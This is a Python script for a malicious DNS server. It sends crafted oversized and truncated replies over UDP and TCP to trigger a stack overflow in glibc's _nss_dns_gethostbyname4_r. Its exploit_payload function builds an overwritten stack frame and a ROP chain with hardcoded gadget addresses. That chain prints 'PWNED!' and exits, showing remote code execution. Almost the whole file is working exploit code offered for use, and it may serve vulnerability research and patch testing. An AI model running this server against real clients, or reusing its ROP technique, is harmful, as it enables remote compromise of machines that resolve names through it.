#!/usr/bin/env python3

import socket
import struct
import threading
import time
import sys

from dnsutil import DNSParser, DNSMessage, DNSHeader, DNSQuestion, DNSRR, DNSFlags

HOST=""
PORT=53


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)

def stackptr(v):
    return struct.pack("<Q", v)

def stackval(v):
    return struct.pack("<Q", v)

def log(*args):
    print(*args)
    sys.stdout.flush()


def truncated_over2k(request):
    """Sends a reply > 2048 bytes with valid header/question and TC flag set"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 2048


def valid_over2k(request):
    """Sends a reply > 2048 bytes with valid header/question"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 2048


def truncated_over1k(request):
    """Sends a reply > 1024 bytes (but less than 2048 bytes) with valid header/question and TC flag set"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 1024


def valid_exact2k(request):
    """Sends a reply exactly 2048 bytes long with valid header/question"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    padlen = 2048 - len(header.bytes()) - len(question.bytes())
    return header.bytes() + question.bytes() + b"\x42" * padlen


def valid_exact1k(request):
    """Sends a reply exactly 1024 bytes long with valid header/question"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    padlen = 1024 - len(header.bytes()) - len(question.bytes())
    return header.bytes() + question.bytes() + b"\x42" * padlen


def invalid_over2k(request):
    """Sends a reply > 2048 bytes with invalid ID"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(0x0000, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 2048


def payload_size(request, size):
    """Send a reply with a valid payload of specified length"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]
    rtype = question.qtype

    if rtype == 28:
        answer = dw(0xc00c) + dw(rtype) + dw(1) + dd(0) + dw(16) + b"\x42" * 16
    elif rtype == 1:
        answer = dw(0xc00c) + dw(rtype) + dw(1) + dd(0) + dw(4) + b"\x42" * 4

    ancount = 1 + size // len(answer)

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    return header.bytes() + question.bytes() + b"".join([answer[:-2] + dw(i) for i in range(ancount)])


def exploit_payload(request):
    """Sends an exploit payload for remote code execution"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]
    heapaddr1 = stackptr(int(question.labels[1].decode("ascii"), 16))
    heapaddr2 = stackptr(int(question.labels[2].decode("ascii"), 16))

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    padlen = 2048 - len(header.bytes()) - len(question.bytes()) + 48

    # Local variables that will be overwritten on _nss_dns_gethostbyname4_r()'s stack frame
    nans2p = struct.pack("<L", 65536)
    resplen2 = struct.pack("<L", 2272)
    host_buffer = heapaddr1
    ans2p = heapaddr2

    frame = nans2p + dd(0) * 3 + resplen2 + dd(0) * 7 + heapaddr1 + dd(0) * 2 + heapaddr2 + dd(0) * 28

    # ROP chain
    ropchain = bytes()
    ropchain += stackptr(0x51365f)      # push rsp; pop rbx; ret;
    ropchain += stackptr(0x46a975)      # mov rax, rbx; pop rbx; ret;
    ropchain += stackval(0)             # Padding
    ropchain += stackptr(0x4856bb)      # add rax, 0x28; ret;
    ropchain += stackptr(0x4856bb)      # add rax, 0x28; ret;
    ropchain += stackptr(0x4856bb)      # add rax, 0x28; ret;
    ropchain += stackptr(0x5aa01b)      # mov rdi, rax; je X; cmp [rdi+0x10],0; je Y; pop rdx; ret;
    ropchain += stackval(0x91e1c0)      # GOT entry for puts()
    ropchain += stackptr(0x434729)      # pop rax; ret;
    ropchain += stackptr(0x41b3cd)      # pop rdi; ret;
    ropchain += stackptr(0x5af41b)      # push rax; jmp [rdx];
    ropchain += stackval(42)            # Program return code
    ropchain += stackptr(0x419b69)      # pop rdx; ret;
    ropchain += stackval(0x91e218)      # GOT entry for exit()
    ropchain += stackptr(0x49429d)      # call [rdx]
    ropchain += stackval(0)             # Padding
    ropchain += b"PWNED!\x00\x00"
    ropchain += b"\xFF" * 32            # Nonzero padding

    return header.bytes() + question.bytes() + b"\x00" * padlen + frame + ropchain


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    attack2_state = {}
    attack3_state = {}
    attack4_state = {}

    while True:
        data, addr = sock.recvfrom(1024)
        log("[UDP] Datagram from {}:{}".format(*addr))

        # Parse DNS request
        try:
            tmp, request = DNSParser.parse_message(data)
            log("[UDP] {} bytes in: {}".format(len(data), request.header))
        except Exception as e:
            log("DNSParser error: {}".format(e))
            continue

        # Ensure we have a valid question
        if not request.questions or not request.questions[0].labels:
            continue

        # Execute selected attack
        attack = request.questions[0].labels[0].decode("ascii")
        if attack == "attack1":
            if request.questions[0].qtype == 1:
                log("[attack1] Sending truncated UDP reply to {}:{}".format(*addr))
                data = truncated_over2k(request)
                sock.sendto(data, addr)
        elif attack == "attack2":
            state = attack2_state.get(addr[0], 0)
            if state == 0:
                log("[attack2] Sending invalid reply to first UDP request from {}:{}".format(*addr))
                data = invalid_over2k(request)
                sock.sendto(data, addr)
                attack2_state[addr[0]] = 1
            if state == 1:
                log("[attack2] Ignoring second UDP request from {}:{}".format(*addr))
                attack2_state[addr[0]] = 2
            if state == 2:
                log("[attack2] Sending UDP reply to first retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack2_state[addr[0]] = 3
            if state == 3:
                log("[attack2] Sending UDP reply to second retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack2_state.pop(addr[0], None)
        elif attack == "attack3":
            state = attack3_state.get(addr[0], 0)
            if state == 0:
                log("[attack3] Sending 1024-byte reply to first UDP request from {}:{}".format(*addr))
                data = valid_exact1k(request)
                sock.sendto(data, addr)
                attack3_state[addr[0]] = 1
            if state == 1:
                log("[attack3] Sending truncated > 1024-byte reply to second UDP request from {}:{}".format(*addr))
                data = truncated_over1k(request)
                sock.sendto(data, addr)
                attack3_state.pop(addr[0], None)
        elif attack == "attack4":
            state = attack4_state.get(addr[0], 0)
            if state == 0:
                log("[attack4] Sending 2048-byte reply to first UDP request from {}:{}".format(*addr))
                data = valid_exact2k(request)
                sock.sendto(data, addr)
                attack4_state[addr[0]] = 1
            if state == 1:
                log("[attack4] Sending 1024-byte reply to second UDP request from {}:{}".format(*addr))
                data = valid_exact1k(request)
                sock.sendto(data, addr)
                attack4_state[addr[0]] = 2
            if state == 2:
                log("[attack4] Sending UDP reply to first retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack4_state[addr[0]] = 3
            if state == 3:
                log("[attack4] Sending UDP reply to second retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack4_state.pop(addr[0], None)
        elif attack == "attack5":
            if request.questions[0].qtype == 1:
                log("[attack5] Sending truncated UDP reply to {}:{}".format(*addr))
                data = truncated_over1k(request)
                sock.sendto(data, addr)
        elif attack == "payload1":
            log("[payload1] Sending UDP reply with > 64-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 64)
            sock.sendto(data, addr)
        elif attack == "payload2":
            log("[payload2] Sending UDP reply with > 128-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 128)
            sock.sendto(data, addr)
        elif attack == "payload3":
            log("[payload3] Sending UDP reply with > 256-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 256)
            sock.sendto(data, addr)
        elif attack == "payload4":
            log("[payload4] Sending UDP reply with > 512-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 512)
            sock.sendto(data, addr)
        elif attack == "payload5":
            log("[payload5] Sending UDP reply with > 1024-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 1024)
            sock.sendto(data, addr)
        elif attack == "payload6":
            log("[payload6] Sending UDP reply with > 2048-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 2048)
            sock.sendto(data, addr)
        elif attack == "payload7":
            log("[payload7] Sending UDP reply with > 4096-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 4096)
            sock.sendto(data, addr)
        elif attack == "payload8":
            log("[payload8] Sending UDP reply with > 8192-byte valid payload to {}:{}".format(*addr))
            data = payload_size(request, 8192)
            sock.sendto(data, addr)


def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    attack5_state = {}

    while True:
        conn, addr = sock.accept()
        log("[TCP] Connection from {}:{}".format(*addr))

        while True:
            # Read message length
            try:
                msglen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(msglen)
            except:
                log("[TCP] Disconnected from {}:{}".format(*addr))
                break

            # Parse DNS request header
            tmp, request = DNSParser.parse_message(data)
            log("[TCP] {} bytes in: {}".format(len(data), request.header))

            if not request.questions or not request.questions[0].labels:
                continue

            # Execute selected attack
            attack = request.questions[0].labels[0].decode("ascii")
            if attack == "attack1":
                log("[attack1] Sending > 2048-byte TCP reply to {}:{}".format(*addr))
                data = valid_over2k(request)
                conn.sendall(dw(len(data)) + data)
            elif attack == "attack3":
                log("[attack3] Sending > 2048-byte TCP reply to {}:{}".format(*addr))
                data = valid_over2k(request)
                conn.sendall(dw(len(data)) + data)
            elif attack == "attack5":
                state = attack5_state.get(addr[0], 0)
                if state == 0:
                    log("[attack5] Sending reply to first TCP request from {}:{}".format(*addr))
                    data = valid_over2k(request)
                    conn.sendall(dw(len(data)) + data)
                    attack5_state[addr[0]] = 1
                if state == 1:
                    log("[attack5] Sending empty reply to second TCP request from {}:{}".format(*addr))
                    conn.sendall(dw(0))
                    attack5_state[addr[0]] = 2
                if state == 2:
                    log("[attack5] Sending TCP reply to first retry request from {}:{}".format(*addr))
                    data = valid_over2k(request)
                    conn.sendall(dw(len(data)) + data)
                    attack5_state[addr[0]] = 3
                if state == 3:
                    log("[attack5] Sending TCP reply to second retry request from {}:{}".format(*addr))
                    data = valid_over2k(request)
                    conn.sendall(dw(len(data)) + data)
                    attack5_state.pop(addr[0], None)
            elif attack == "payload1":
                log("[payload1] Sending TCP reply with > 64-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 64)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload2":
                log("[payload2] Sending TCP reply with > 128-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 128)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload3":
                log("[payload3] Sending TCP reply with > 256-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 256)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload4":
                log("[payload4] Sending TCP reply with > 512-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 512)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload5":
                log("[payload5] Sending TCP reply with > 1024-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 1024)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload6":
                log("[payload6] Sending TCP reply with > 2048-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 2048)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload7":
                log("[payload7] Sending TCP reply with > 4096-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 4096)
                conn.sendall(dw(len(data)) + data)
            elif attack == "payload8":
                log("[payload8] Sending TCP reply with > 8192-byte valid payload to {}:{}".format(*addr))
                data = payload_size(request, 8192)
                conn.sendall(dw(len(data)) + data)


if __name__ == "__main__":

    if len(sys.argv) > 1:
        HOST = sys.argv[1]

    if len(sys.argv) > 2:
        PORT = sys.argv[2]
        
    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            log("Starting UDP server on {}:{}...".format(HOST or "*", PORT))
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.daemon = True
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            log("Starting TCP server on {}:{}...".format(HOST or "*", PORT))
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()

        time.sleep(5)

